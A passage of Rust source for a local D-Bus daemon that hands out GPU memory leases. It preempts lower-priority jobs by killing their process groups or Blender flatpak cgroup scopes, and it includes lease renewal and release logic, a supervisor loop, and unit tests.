                    evicted = Some((job.label, job.reclaim, fit));
                } else {
                    inner.owned = Some(job); // not the victim (shouldn't happen) — keep it
                }
            }
        }

        // Narrate the contention for the keyhole's arbitration line (set under the lock,
        // published off it). A fresh, uncontended grant clears it → "no contention".
        inner.last_preempt = match (preempted, &evicted) {
            (Some((_, fit)), Some((label, _, _))) => {
                format!("{} preempted `{}` ({fit})", tier.as_str(), short_label(label))
            }
            (Some((victim, fit)), None) => {
                format!("{} preempted token {victim} ({fit})", tier.as_str())
            }
            _ => String::new(),
        };

        // Install the holder's reclaim handle (under the lock). Cooperative: nothing to own (the caller
        // runs its own process). Spawn: agentosd spawns + OWNS a child — on spawn failure roll the lease
        // back (a lease without its process is worse than no lease) and reclaim any victim. AdoptScope:
        // record the flatpak lane's pinned cgroup scope as the reclaim handle (ADR-0022 Phase 1).
        let mut owned_pid: Option<u32> = None;
        let bind_peer = !matches!(kind, AcquireKind::Spawn(_));
        let kind_note = match &kind {
            AcquireKind::AdoptScope { handle, lane_pid, .. } => {
                Some(format!("adopted lane `{}` (pid {lane_pid})", handle.scope_unit))
            }
            _ => None,
        };
        match kind {
            AcquireKind::Cooperative => {}
            AcquireKind::Spawn(args) => match spawn_owned(&args) {
                Ok((child, pid)) => {
                    owned_pid = Some(pid);
                    inner.owned =
                        Some(OwnedJob { token, label: args.join(" "), reclaim: Reclaim::Spawned { child, pid } });
                }
                Err(e) => {
                    inner.lease.release(token);
                    drop(inner);
                    if let Some((label, reclaim, _)) = evicted {
                        eprintln!("coordd: spawn failed after preempting `{}` — reclaiming it", short_label(&label));
                        self.perform_reclaim(label, reclaim, "n/a", free_opt.unwrap_or(0)).await;
                    }
                    // Lease rolled back → publish "no contention" (off-lock; inner is dropped).
                    write_lease_mirror(self.mirror.as_deref(), &Lease::default());
                    return (false, 0, format!("spawn failed: {e}"));
                }
            },
            AcquireKind::AdoptScope { handle, dir, lane_pid } => {
                let label = handle.scope_unit.clone();
                inner.owned =
                    Some(OwnedJob { token, label, reclaim: Reclaim::Scope { handle, dir, lane_pid } });
            }
        }

        // Record the caller's bus name for peer-disconnect auto-release (B4) + GO-2 identity binding —
        // for a *cooperative* holder (its own process IS the GPU user) AND for an *adopted lane* (so only
        // the adopter may `Release` it, review B2 — the small monotonic token alone is guessable). A
        // `Spawn` job stays unbound (`None`): the daemon owns the child and the `busctl`-per-call caller
        // may disconnect between Spawn and Release. The supervisor SKIPS the B4 disconnect-release for any
        // owned holder (Spawn or Scope), so a fire-and-forget launcher exiting can't drop a live lane.
        inner.holder_peer = if bind_peer { caller.map(|c| (token, c)) } else { None };
        inner.holder_deadline = Some(Instant::now() + lease_ttl()); // B5: start the TTL clock

        let mirror_snap = lease_snapshot(&inner);
        drop(inner);

        // Reclaim the evicted victim OFF the lock (review C5): a Spawned victim → group SIGKILL + reap;
        // a Scope victim → cgroup.kill via its pinned fd, then backpressure the grant until VRAM frees.
        // Whether a SIGKILL/cgroup reclaim actually ran (an OWNED victim). Captured before `evicted` is
        // moved into the reclaim, so the ADR-0029 §3 log below can be honest about the backstop.
        let victim_reclaimed = evicted.is_some();
        if let Some((label, reclaim, fit)) = evicted {
            self.perform_reclaim(label, reclaim, fit, free_opt.unwrap_or(0)).await;
        }

        // ADR-0029 §3: if the victim was the live UE wallpaper (`Tier::Yielding`), surface the
        // governor's PROACTIVE throttle-not-kill decision (the two-number-footprint call, D4). NB the
        // RC throttle TRANSPORT and the lease-side coexistence model are unbuilt (ADR-0029 Open §B +
        // the reservation model), so an OWNED `Yielding` victim still took the SIGKILL backstop above —
        // this logs the decision the governor WILL enact (throttle UE to floor + coexist, or kill) once
        // the hardened Remote Control client lands. Computed off the lock from the pre-eviction footprints.
        if prev_tier == Some(Tier::Yielding) {
            let action = crate::governor::plan_preemption(crate::coord::yield_decision(
                free_opt.unwrap_or(0),
                prev_est,        // UE's current (full) footprint = its admitted estimate
                ue_floor_mib(),  // UE's throttled-floor footprint (Phase-A ~1 GB; re-measure per tableau)
                est,
                headroom,
            ));
            // Honest about what ACTUALLY happened: an owned UE PID took the SIGKILL backstop; a
            // cooperative (unowned) wallpaper did not (it must self-release — not the intended profile).
            let backstop = if victim_reclaimed {
                "SIGKILL backstop applied"
            } else {
                "no owned PID — cooperative victim must self-release"
            };
            eprintln!(
                "coordd: ADR-0029 §3 — {} preempted the UE wallpaper; governor decision: {} \
                 [RC throttle + coexistence GATED on ADR-0029 §B → {backstop}]",
                tier.as_str(),
                action.describe(),
            );
        }

        // Publish the new arbitration state to the keyhole mirror — OFF the lock (ADR-0012 §3).
        write_lease_mirror(self.mirror.as_deref(), &mirror_snap);

        let mut msg = match preempted {
            Some((victim, fit)) => {
                format!("granted {} token {token}; preempted token {victim} ({fit})", tier.as_str())
            }
            None => format!("granted {} token {token}", tier.as_str()),
        };
        match free_opt {
            Some(free) => { let _ = write!(msg, " (free {free}M)"); }
            None => msg.push_str(" (free unknown)"),
        }
        if let Some(pid) = owned_pid {
            let _ = write!(msg, "; agentosd owns pid {pid}");
        }
        if let Some(note) = kind_note {
            let _ = write!(msg, "; {note}");
        }
        // H1: a granted-but-won't-fit preempt is loud — the successor must offload/shrink.
        if matches!(preempted, Some((_, "WONT-FIT"))) {
            eprintln!(
                "coordd: WARNING token {token} granted but WONT-FIT after eviction — \
                 successor must offload/shrink (ADR-0004)"
            );
        }
        (true, token, msg)
    }

    /// Reap an evicted/released child, then prove reclaim. The SIGKILL (to the group) has
    /// already been sent; we `wait()` the leader so the Δ is read after *actual* exit (H2),
    /// not a fixed-sleep guess. Off the response path so the handler stays snappy.
    fn spawn_reclaim_task(&self, mut child: Child, before: u64) {
        let nvml = Arc::clone(&self.nvml);
        tokio::spawn(async move {
            let _ = child.wait().await; // reap the leader (no zombie)
            tokio::time::sleep(Duration::from_millis(150)).await; // brief driver settle
            if let Some(after) = free_mib(&nvml).await {
                println!(
                    "coordd: post-evict free {after}M (was {before}M; Δ {}M reclaimed)",
                    after.saturating_sub(before)
                );
            }
        });
    }

    /// Reclaim an evicted owned holder's GPU — the destructive lever, run OFF the `Inner` lock (review
    /// C5). The lever depends on how the holder was launched (ADR-0013 vs ADR-0022 Phase 1).
    async fn perform_reclaim(&self, label: String, reclaim: Reclaim, fit: &str, before_free: u64) {
        match reclaim {
            Reclaim::Spawned { child, pid } => {
                println!(
                    "coordd: PREEMPT → SIGKILL group of `{}` pid {pid} \
                     (own-PID/group evict, ADR-0010 §5; successor {fit})",
                    short_label(&label)
                );
                sigkill_group(pid);
                self.spawn_reclaim_task(child, before_free); // reap + prove reclaim off-path (H2)
            }
            Reclaim::Scope { handle, dir, lane_pid } => {
                self.reclaim_scope(handle, dir, lane_pid, fit, before_free).await;
            }
        }
    }

    /// SIGKILL a flatpak lane by its cgroup scope (ADR-0022 Phase 1), then BACKPRESSURE the grant: hold
    /// the successor's "granted" response until the lane's VRAM is actually freed (review B2 —
    /// `cgroup.kill` returns when the SIGKILL is *queued*, not when the driver tore down the CUDA context).
    /// Entirely off the lock; bounded so a hung lane can't stall the caller forever (fail-open, ADR-0003 —
    /// the next admission's true-free NVML read governs). The pinned dir-fd (`dir`) makes the kill
    /// recycle-proof (B3): if the scope was reaped/reused, `openat` fails and we treat it as already gone.
    async fn reclaim_scope(&self, handle: ScopeHandle, dir: File, lane_pid: u32, fit: &str, before_free: u64) {
        match scope_reclaim::kill_scope_at(&dir) {
            Ok(true) => println!(
                "coordd: PREEMPT → cgroup.kill `{}` (lane pid {lane_pid}, {}; successor {fit})",
                handle.scope_unit,
                handle.cgroup_kill_path().display()
            ),
            Ok(false) => {
                println!("coordd: PREEMPT `{}` — scope already gone (lane exited; nothing to kill)", handle.scope_unit)
            }
            Err(e) => {
                // Fail-open (ADR-0003): can't reclaim (e.g. an older kernel without cgroup.kill) → log,
                // never panic; the lane runs on uncoordinated and the next admission avoids piling on.
                eprintln!(
                    "coordd: WARNING could not cgroup.kill `{}`: {e} — lane runs uncoordinated (fail-open)",
                    handle.scope_unit
                );
                return;
            }
        }
        // Confirm the lane actually emptied (pinned fd) before re-reading free, so the just-granted
        // successor doesn't allocate into not-yet-freed VRAM (B2). Bounded — a hung lane is left to the TTL.
        let mut emptied = false;
        for _ in 0..SCOPE_RECLAIM_POLLS {
            if scope_reclaim::scope_is_empty_at(&dir) {
                emptied = true;
                break;
            }
            tokio::time::sleep(SCOPE_RECLAIM_POLL_INTERVAL).await;
        }
        tokio::time::sleep(Duration::from_millis(150)).await; // brief driver settle
        if let Some(after) = free_mib(&self.nvml).await {
            println!(
                "coordd: post-reclaim free {after}M (was {before_free}M; Δ {}M){}",
                after.saturating_sub(before_free),
                if emptied { " reclaimed" } else { " — WARNING lane scope not confirmed empty (fail-open)" }
            );
        }
    }
}

#[zbus::interface(name = "org.agentos.Coordinator1")]
impl Coordinator {
    /// Cooperative lease: the caller runs + owns its own GPU process (e.g. Hermes
    /// interactive inference) and must `Release` when done. agentosd owns nothing.
    /// `(granted, token, outcome)`; `token` is 0 when not granted.
    async fn acquire(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
    ) -> (bool, u64, String) {
        let caller = hdr.sender().map(|s| s.to_string());
        // The session-bus D-Bus verbs are the trusted Hermes/human/CLI path (ADR-0021): tier passes
        // through. The future agent-facing `act` verbs are the first `CallerClass::Agent` callers.
        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, AcquireKind::Cooperative).await
    }

    /// Owned lease via a daemon-owned launch *profile* (ADR-0013 A2 — no caller-supplied
    /// binary). `profile` names an allowlisted command (`PROFILES`); `params` are appended as
    /// literal args (no shell). agentosd spawns + holds the PID so it can SIGKILL it on
    /// preemption (the overnight batch / ComfyUI pattern, ADR-0009/0010 §5).
    async fn spawn(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
        profile: String,
        params: Vec<String>,
    ) -> (bool, u64, String) {
        let Some(mut argv) = resolve_profile(&profile) else {
            return (false, 0, format!("spawn: unknown profile `{profile}` (allowed: {})", profile_names()));
        };
        argv.extend(params);
        let caller = hdr.sender().map(|s| s.to_string());
        self.do_acquire(caller, CallerClass::Trusted, tier, estimate_mib, AcquireKind::Spawn(argv)).await
    }

    /// Adopt an externally-launched flatpak Blender **lane** (ADR-0022 Phase 1): register its systemd
    /// cgroup scope as the lease's reclaim handle so a higher tier can SIGKILL the lane (`cgroup.kill`)
    /// when the desktop needs the GPU back — the lever a process-group SIGKILL can't reach (the lane is
    /// reparented into a transient scope). `lane_pid` is the lane's listening PID; the daemon resolves the
    /// scope ITSELF from `/proc/<pid>/cgroup` (never a caller-supplied path, review B1) and admits ONLY an
    /// allowlisted `app-flatpak-org.blender.Blender-*.scope` — the editor/terminal/browser can never be
    /// adopted. `(granted, token, msg)`; `token` is 0 when not granted. Fail-open: a non-lane PID or an
    /// un-pinnable scope is refused, not fatal — the caller (`blender-mcp.sh`) then runs uncoordinated.
    async fn adopt_scope(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
        lane_pid: u32,
    ) -> (bool, u64, String) {
        // A lane is a background GPU consumer — it must NEVER hold Interactive (the only non-preemptible
        // tier; an Interactive lane could never be reclaimed, defeating the whole point of adopting it).
        // Clamp the requested tier to ≤ Batch here (GO-1 style: clamp, don't error). do_acquire's
        // `class.clamp` is a no-op for Trusted, so the ceiling has to be applied at this verb.
        let tier = match Tier::from_arg(&tier) {
            Ok(t) => t.clamp_to(Tier::Batch).as_str().to_string(),
            Err(e) => return (false, 0, format!("adopt: {e}")),
        };
        // Resolve + allowlist the scope SERVER-SIDE from the PID (B1) — a non-lane PID can never arm a kill.
        let Some(handle) = scope_reclaim::resolve_lane_scope(lane_pid) else {
            return (false, 0, format!("adopt: pid {lane_pid} is not a flatpak Blender lane scope (refused)"));
        };
        // Pin the scope's cgroup dir as a dir-fd NOW (B3): a recycled scope name can't redirect the later
        // kill. If we can't pin it, don't adopt — better the lane runs uncoordinated than hold a stale
        // kill handle that could land on the wrong cgroup.
        let dir = match scope_reclaim::open_scope_dir(&handle) {
            Ok(d) => d,
            Err(e) => return (false, 0, format!("adopt: cannot pin scope `{}`: {e}", handle.scope_unit)),
        };
        let caller = hdr.sender().map(|s| s.to_string());
        // CallerClass::Trusted: `AdoptScope` is a DESTRUCTIVE verb, but for the trusted human-operated
        // forge it is Trusted (ADR-0022 §4). The autonomous path (ADR-0020 `act` verbs) MUST NOT reach
        // this verb until GO-2 identity + the §4 hardening land — for an untrusted caller an adopt would be
        // a cross-principal kill primitive (security review C2). The GO-1 clamp in do_acquire binds then.
        self.do_acquire(
            caller,
            CallerClass::Trusted,
            tier,
            estimate_mib,
            AcquireKind::AdoptScope { handle, dir, lane_pid },
        )
        .await
    }

    /// Release the lease (true iff `token` is the current holder's). If that holder is an
    /// agentosd-owned job, its process group is SIGKILLed too — releasing means "done with
    /// the GPU" — and the leader is reaped (no zombie).
    async fn release(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        token: u64,
    ) -> bool {
        // GO-2 (ADR-0021): bind the release to the caller identity — a cooperative lease can only be
        // released by the bus name that acquired it (`holder_peer`), so one agent can't release another's.
        let caller = hdr.sender().map(|s| s.to_string());
        release_token(&self.inner, self.mirror.as_deref(), token, caller.as_deref()).await
    }

    /// Heartbeat the lease (ADR-0013 B5): extend the holder's TTL. True iff `token` holds AND the
    /// caller identity is allowed to renew it (GO-2). A long-running holder (a Wan 14B dream, a long
    /// inference) calls this periodically; absent a `Renew`, the supervisor auto-expires the lease so a
    /// stuck holder can't wedge the lane.
    async fn renew(&self, #[zbus(header)] hdr: zbus::message::Header<'_>, token: u64) -> bool {
        // GO-2 (ADR-0021 ratification must-fix #1): renew is identity-bound exactly like release — a
        // bound cooperative lease may only be renewed by the bus name that acquired it, so one agent
        // can't extend (or pin) another's TTL via the guessable monotonic token. Shares `may_release`.
        let caller = hdr.sender().map(|s| s.to_string());
        let mut inner = self.inner.lock().await;
        if may_renew(
            inner.holder_peer.as_ref(),
            inner.lease.holder_token(),
            inner.lease.holder_tier().is_some(),
            token,
            caller.as_deref(),
        ) {
            inner.holder_deadline = Some(Instant::now() + lease_ttl());
            true
        } else {
            false
        }
    }

    /// `(held, tier, token, free_mib)` — current lease + live free VRAM.
    async fn status(&self) -> (bool, String, u64, u32) {
        let free = free_mib(&self.nvml).await.unwrap_or(0) as u32;
        let inner = self.inner.lock().await;
        match inner.lease.holder_tier() {
            Some(t) => (true, t.as_str().to_string(), inner.lease.holder_token(), free),
            None => (false, String::new(), 0, free),
        }
    }
}

pub fn run() -> Result<(), Box<dyn std::error::Error>> {
    let rt = tokio::runtime::Builder::new_multi_thread().enable_all().build()?;
    rt.block_on(serve())
}

/// Background supervisor: reap a *naturally*-exited owned child and auto-release its
/// lease. Polls `try_wait` (never holds a `wait` future, so it never races the D-Bus
/// handlers for the child). The monotonic-token guard makes a late reap a safe no-op if
/// the holder has since changed.
async fn supervise(inner: Arc<Mutex<Inner>>, mirror: Option<PathBuf>, conn: zbus::Connection) {
    // For B4 peer-liveness checks. If the proxy can't be built, peer-disconnect detection is
    // simply off (the natural-exit reap still works) — degrade, don't crash.
    let dbus = zbus::fdo::DBusProxy::new(&conn).await.ok();
    loop {
        tokio::time::sleep(Duration::from_millis(750)).await;

        // 1. Reap a *naturally*-exited owned child and auto-release its lease. `try_wait` never
        //    holds a `wait` future, so it can't race the D-Bus handlers for the child. The
        //    monotonic-token guard makes a late reap a safe no-op if the holder has changed.
        let (exited, snap) = {
            let mut g = inner.lock().await;
            // Natural-exit detection differs by reclaim kind: a spawned child is reaped via `try_wait`; an
            // adopted lane is "exited" when its cgroup scope has emptied (read via the pinned fd — only a
            // GONE scope counts as empty, review C2, so a transient read flap can't false-release a live
            // lane). Done under the lock + by the job's own token, so a late detect is a safe no-op (C3).
            let done: Option<(u64, String, String)> = match g.owned.as_mut() {
                Some(job) => match &mut job.reclaim {
                    Reclaim::Spawned { child, .. } => child
                        .try_wait()
                        .ok()
                        .flatten()
                        .map(|status| (job.token, job.label.clone(), format!("exited ({status})"))),
                    Reclaim::Scope { dir, .. } => scope_reclaim::scope_is_empty_at(dir)
                        .then(|| (job.token, job.label.clone(), "lane scope emptied".to_string())),
                },
                None => None,
            };
            if let Some((token, _, _)) = &done {
                g.owned = None;
                g.lease.release(*token);
                if g.holder_peer.as_ref().is_some_and(|(t, _)| t == token) {
                    g.holder_peer = None;
                }
                if g.lease.holder_tier().is_none() {
                    g.last_preempt.clear();
                }
            }
            (done, lease_snapshot(&g))
        };
        if let Some((token, label, reason)) = exited {
            println!("coordd: owned job `{}` (token {token}) {reason} → lease released", short_label(&label));
            // Publish off-lock (the guard is already dropped) so the keyhole reflects the release.
            write_lease_mirror(mirror.as_deref(), &snap);
        }

        // 2. Peer-disconnect auto-release (ADR-0013 B4): if the lease holder's D-Bus peer has
        //    vanished (crashed without `Release`), free the lease so a dead holder can't wedge
        //    the lane forever (finding H4). Poll-based — reuses this loop, no signal stream.
        if let Some(dbus) = &dbus {
            let (peer, owned_token) = {
                let g = inner.lock().await;
                (g.holder_peer.clone(), g.owned.as_ref().map(|j| j.token))
            };
            if let Some((token, name)) = peer {
                // B4 governs a COOPERATIVE holder (its own process IS the GPU user). An owned holder — a
                // Spawn child OR an adopted lane (review B2 binds its peer for GO-2 Release authz) — has its
                // own liveness signal (child exit / scope empty), so a fire-and-forget launcher (e.g.
                // `blender-mcp.sh`) disconnecting must NOT drop a live lane. Skip B4 for an owned token.
                if owned_token != Some(token) {
                    let alive = match zbus::names::BusName::try_from(name.as_str()) {
                        Ok(bn) => dbus.name_has_owner(bn).await.unwrap_or(true), // on error assume alive
                        Err(_) => true,
                    };
                    if !alive {
                        println!("coordd: holder peer {name} gone → auto-release token {token} (ADR-0013 B4)");
                        release_token(&inner, mirror.as_deref(), token, None).await; // authoritative (B4)
                    }
                }
            }
        }

        // 3. TTL expiry (B5): a holder past its deadline without a Renew is auto-released —
        //    backstops a stuck/buggy holder and an owned job whose Spawn caller crashed.
        let expired = {
            let g = inner.lock().await;
            match (g.lease.holder_token(), g.holder_deadline) {
                (tok, Some(dl)) if tok != 0 && Instant::now() >= dl => Some(tok),
                _ => None,
            }
        };
        if let Some(tok) = expired {
            println!("coordd: lease TTL expired → auto-release token {tok} (ADR-0013 B5)");
            release_token(&inner, mirror.as_deref(), tok, None).await; // authoritative (B5 TTL)
        }
    }
}

async fn serve() -> Result<(), Box<dyn std::error::Error>> {
    let nvml = Arc::new(
        Nvml::init().map_err(|e| format!("NVML init failed (is the NVIDIA driver loaded?): {e}"))?,
    );
    let inner = Arc::new(Mutex::new(Inner::new()));
    let mirror = feed_dir().ok().map(|d| d.join("lease.json"));
    // Publish an initial "no contention" so the keyhole has a file to read from the first tick.
    write_lease_mirror(mirror.as_deref(), &Lease::default());

    let obj = Coordinator { inner: Arc::clone(&inner), nvml, mirror: mirror.clone() };
    let conn = zbus::connection::Builder::session()?
        .name(BUS_NAME)?
        .serve_at(OBJ_PATH, obj)?
        .build()
        .await?;
    // Supervisor needs the connection for B4 peer-liveness checks; keep `conn` alive until exit.
    tokio::spawn(supervise(Arc::clone(&inner), mirror, conn.clone()));

    // ADR-0023 P1 (home A): mount the `org.agentos.Wind1` window-drag→wind sink on THIS connection +
    // spawn its fixed-tick spring task. It owns ONLY its own state (no path to `Inner`) so the 60 Hz
    // tick can never delay a preemption SIGKILL (Design 0023 §3.1). Fail-open: a mount failure is
    // logged, never fatal — the coordinator keeps serving regardless.
    let wind_dir = feed_dir().ok();
    crate::wind::attach(&conn, wind_dir).await;

    println!("agentosd coordd — VRAM coordinator daemon serving {BUS_NAME} (ADR-0006/0010)");
    println!("  spawn (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch 2000 sleep 1 600");
    println!("  eevee (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch {EEVEE_RENDER_EST_MIB} eevee-render 2 --out /run/user/$UID/agentos/blender  (ADR-0023; light lane)");
    println!("  acquire (coop): busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Acquire su interactive 5000");
    println!("  adopt (lane)  : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} AdoptScope suu batch 3000 <lane_pid>  (ADR-0022)");
    println!("  status        : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Status");
    println!("  release       : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Release t <token>");
    tokio::signal::ctrl_c().await?;
    println!("agentosd coordd — shutdown");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fits() -> Admission {
        admit(20_000, 2_000, HEADROOM_MIB) // plenty of room
    }
    fn wont_fit() -> Admission {
        admit(1_000, 50_000, HEADROOM_MIB) // far too big
    }

    #[test]
    fn warm_reclaim_eligibility_is_heavy_lane_vram_short_only() {
        let est = 17_000;
        let hr = headroom_for(est);
        // Batch/best-effort that won't fit (free far below est+headroom) → eligible for graceful reclaim.
        assert!(warm_reclaim_eligible(Tier::Batch, Some(2_000), est, hr));
        assert!(warm_reclaim_eligible(Tier::BestEffort, Some(2_000), est, hr));
        // The SAME shortfall on Interactive is NOT eligible — it fails open and must never wait on an
        // `ollama stop` (ADR-0003). This is the load-bearing asymmetry.
        assert!(!warm_reclaim_eligible(Tier::Interactive, Some(2_000), est, hr));
        // A batch request that already fits doesn't reclaim (no shortfall → admission would grant).
        assert!(!warm_reclaim_eligible(Tier::Batch, Some(20_000), est, hr));
        // Unreadable NVML (None) is never eligible — never unload the warm pool blind.
        assert!(!warm_reclaim_eligible(Tier::Batch, None, est, hr));
    }

    #[test]
    fn short_label_is_basename_of_argv0() {
        assert_eq!(short_label("/usr/bin/python main.py"), "python");
        assert_eq!(short_label("comfyui --port 8188"), "comfyui");
        assert_eq!(short_label(""), "");
        // The comfyui launch profile maps to a friendly holder so the tray reads "batch (comfyui)"
        // (matches the keyhole WORKLOAD label) rather than the raw launcher basename.
        assert_eq!(
            short_label("/home/corey/Documents/AgentOS/spikes/dreaming/start-comfyui.sh"),
            "comfyui"
        );
        // The Blender render profile (ADR-0022) maps the same way → tray reads "batch (blender-render)".
        assert_eq!(
            short_label("/home/corey/Documents/AgentOS/integrations/blender/render-wrapper.sh"),
            "blender-render"
        );
        // An adopted lane's label IS its scope unit → collapses to a stable tray name (ADR-0022 Phase 1),
        // never the noisy per-instance id.
        assert_eq!(short_label("app-flatpak-org.blender.Blender-3630677696.scope"), "blender-lane");
        assert_eq!(short_label("app-flatpak-org.blender.Blender-1.scope"), "blender-lane");
    }

    #[test]
    fn mirror_snapshot_idle_is_no_contention() {
        let inner = Inner::new();
        assert_eq!(lease_snapshot(&inner), Lease::default());
    }

    #[test]
    fn mirror_snapshot_reflects_tier_and_preempt_but_not_a_faked_holder() {
        let mut inner = Inner::new();
        // A cooperative interactive holder: agentosd knows the tier, not the process name.
        inner.lease.acquire(Tier::Interactive, &fits());
        inner.last_preempt = "interactive preempted token 1 (fits)".into();
        let snap = lease_snapshot(&inner);
        assert_eq!(snap.tier, "interactive");
        assert_eq!(snap.holder, ""); // honest: not fabricated for a cooperative holder
        assert_eq!(snap.preempt, "interactive preempted token 1 (fits)");
    }

    #[test]
    fn fresh_acquire_grants_token_one() {
        let mut st = LeaseState::new();
        assert_eq!(st.acquire(Tier::Batch, &fits()), AcquireResult::Granted { token: 1 });
        assert_eq!(st.holder_tier(), Some(Tier::Batch));
        assert_eq!(st.holder_token(), 1);
    }

    #[test]
    fn equal_tier_is_queued_and_holder_unchanged() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits());
        assert_eq!(st.acquire(Tier::Batch, &fits()), AcquireResult::Queued);
        assert_eq!(st.holder_token(), 1);
    }

    #[test]
    fn interactive_preempts_batch_with_new_token_and_victim() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        assert_eq!(
            st.acquire(Tier::Interactive, &fits()),
            AcquireResult::Preempted { token: 2, victim: 1 }
        );
        assert_eq!(st.holder_tier(), Some(Tier::Interactive));
        assert_eq!(st.holder_token(), 2);
    }

    #[test]
    fn an_agent_clamped_request_queues_behind_interactive_instead_of_preempting() {
        // ADR-0021 GO-1 at the install boundary: an agent asks for interactive, the core clamps it
        // to batch, so against a live interactive holder it QUEUES — the desktop is never preempted.
        let mut st = LeaseState::new();
        st.acquire(Tier::Interactive, &fits()); // a live human/interactive holder, token 1
        let agent_tier = CallerClass::Agent.clamp(Tier::Interactive); // == Batch
        assert_eq!(st.acquire(agent_tier, &fits()), AcquireResult::Queued);
        assert_eq!(st.holder_token(), 1); // incumbent untouched
        assert_eq!(st.holder_tier(), Some(Tier::Interactive));
    }

    #[test]
    fn go2_release_is_identity_bound_for_cooperative_holders() {
        // ADR-0021 GO-2: a bound cooperative lease is releasable ONLY by its acquiring peer, so one
        // agent behind the MCP act surface can't release (DoS) another's lease.
        let bound = (7u64, ":1.42".to_string()); // token 7 acquired by bus name :1.42
        assert!(!may_release(Some(&bound), 7, Some(":1.99")), "a foreign peer cannot release it");
        assert!(may_release(Some(&bound), 7, Some(":1.42")), "the acquiring peer can");
        assert!(may_release(Some(&bound), 7, None), "an authoritative system release (B4/B5) always may");
        assert!(may_release(None, 7, Some(":1.99")), "an unbound (owned) holder stays token-only");
        // A token that isn't the bound one falls through to the token guard (release() then fails it),
        // so a foreign release reads as "unknown token" — identical failure, no state change.
        assert!(may_release(Some(&bound), 999, Some(":1.99")));
    }

    #[test]
    fn go2_renew_is_identity_bound_like_release() {
        // ADR-0021 GO-2 ratification must-fix #1: renew must be identity-bound exactly like release,
        // or a peer that guessed the monotonic token could pin/extend another holder's lease and defeat
        // the B5 stuck-holder backstop. (holder_token=7, holder_live=true unless noted.)
        let bound = (7u64, ":1.42".to_string()); // token 7 held by bus name :1.42
        assert!(may_renew(Some(&bound), 7, true, 7, Some(":1.42")), "the acquiring peer renews its own live lease");
        assert!(!may_renew(Some(&bound), 7, true, 7, Some(":1.99")), "a foreign peer cannot renew it (the hole this fixes)");
        assert!(!may_renew(Some(&bound), 7, true, 8, Some(":1.42")), "even the right peer can't renew a non-holder token");
        assert!(!may_renew(Some(&bound), 7, false, 7, Some(":1.42")), "no live holder (tier gone) → nothing to renew");
        // An unbound (owned Spawn) holder stays token-only, so the busctl-per-call dream client renews
        // across fresh connections (different bus name each call) — no regression.
        assert!(may_renew(None, 5, true, 5, Some(":1.99")), "an unbound owned holder stays token-only");
    }

    #[test]
    fn adopt_scope_clamps_a_lane_to_at_most_batch() {
        // The invariant `adopt_scope` enforces (ADR-0022 + review): a lane must never be Interactive — the
        // only non-preemptible tier — or it could never be reclaimed. Interactive clamps to Batch; lower
        // tiers pass through. (do_acquire's Trusted clamp is identity, so this ceiling lives at the verb.)
        assert_eq!(Tier::from_arg("interactive").unwrap().clamp_to(Tier::Batch), Tier::Batch);
        assert_eq!(Tier::from_arg("batch").unwrap().clamp_to(Tier::Batch), Tier::Batch);
        assert_eq!(Tier::from_arg("best-effort").unwrap().clamp_to(Tier::Batch), Tier::BestEffort);
        // End-to-end: a lane clamped to Batch QUEUES behind a live Interactive holder (never preempts it).
        let mut st = LeaseState::new();
        st.acquire(Tier::Interactive, &fits()); // a live human/interactive holder
        let lane_tier = Tier::from_arg("interactive").unwrap().clamp_to(Tier::Batch); // == Batch
        assert_eq!(st.acquire(lane_tier, &fits()), AcquireResult::Queued);
    }

    #[test]
    fn fresh_grant_is_denied_when_it_wont_fit() {
        let mut st = LeaseState::new();
        assert_eq!(st.acquire(Tier::Batch, &wont_fit()), AcquireResult::Denied);
        assert_eq!(st.holder_tier(), None); // nothing was acquired
    }

    #[test]
    fn preempt_ignores_admission_because_eviction_frees_vram() {
        // The batch holds; interactive arrives and current-free won't fit — it STILL
        // preempts, because SIGKILLing the batch reclaims its VRAM (§5/§6).
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits());
        assert_eq!(
            st.acquire(Tier::Interactive, &wont_fit()),
            AcquireResult::Preempted { token: 2, victim: 1 }
        );
    }

    #[test]
    fn release_requires_the_current_token() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        assert!(!st.release(99)); // wrong token: no-op
        assert!(st.holder_tier().is_some());
        assert!(st.release(1));
        assert_eq!(st.holder_tier(), None);
    }

    #[test]
    fn stale_release_from_a_preempted_holder_cannot_free_its_successor() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &fits()); // token 1
        st.acquire(Tier::Interactive, &fits()); // token 2 preempts
        assert!(!st.release(1)); // the evicted batch's stale release must not fire
        assert_eq!(st.holder_token(), 2); // interactive still holds
        assert!(st.release(2));
        assert_eq!(st.holder_tier(), None);
    }

    #[test]
    fn release_on_an_empty_lease_is_false() {
        assert!(!LeaseState::new().release(1));
    }

    #[test]
    fn holder_est_is_carried_through_acquire() {
        let mut st = LeaseState::new();
        st.acquire(Tier::Batch, &admit(20_000, 3_000, 512)); // est 3000
        assert_eq!(st.holder_est(), Some(3_000));
        st.acquire(Tier::Interactive, &admit(20_000, 9_000, 512)); // preempt, est 9000
        assert_eq!(st.holder_est(), Some(9_000));
    }

    #[test]
    fn headroom_scales_with_estimate_floored_at_base() {
        assert_eq!(headroom_for(0), HEADROOM_MIB); // floor
        assert_eq!(headroom_for(4_000), HEADROOM_MIB); // 250 < 512 → floor
        assert_eq!(headroom_for(20_000), 1_250); // 6.25% dominates the floor
    }

    #[test]
    fn cooldown_blocks_the_evicted_tier_but_never_interactive() {
        let t0 = Instant::now();
